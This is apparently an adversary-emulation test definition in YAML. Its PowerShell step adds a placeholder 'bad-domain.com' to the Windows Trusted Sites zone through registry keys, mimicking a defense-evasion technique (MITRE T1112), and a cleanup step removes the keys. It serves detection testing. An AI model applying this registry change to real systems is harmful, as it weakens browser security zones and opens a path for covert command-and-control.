api_version: "2.0"
name: Add domain to Trusted sites Zone
description: |
    Attackers may add a domain to the trusted site zone to bypass defenses. Doing this enables attacks such as c2 over office365.
    Upon execution, details of the new registry entries will be displayed.
    Additionally, open Registry Editor to view the modified entry in HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\.

    https://www.blackhat.com/docs/us-17/wednesday/us-17-Dods-Infecting-The-Enterprise-Abusing-Office365-Powershell-For-Covert-C2.pdf
args:
    - name: bad_domain
      type: string
      default: bad-domain.com
uuid: cf447677-5a4e-4937-a82c-e47d254afd57
mitre:
    tactics:
        - 'TA0005: Defense Evasion'
    techniques:
        - 'T1112: Modify Registry'
requirements:
    platforms:
        - os: windows
steps:
    - name: add-domain-to-trusted-sites-zone
      inline: |
        $key= "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\{{.Args.bad_domain}}\"
        $name ="bad-subdomain"
        new-item $key -Name $name -Force
        new-itemproperty $key$name -Name https -Value 2 -Type DWORD;
        new-itemproperty $key$name -Name http  -Value 2 -Type DWORD;
        new-itemproperty $key$name -Name *     -Value 2 -Type DWORD;
      executor: powershell
      cleanup:
        inline: |
            $key = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\{{.Args.bad_domain}}\"
            Remove-item  $key -Recurse -ErrorAction Ignore
        executor: powershell
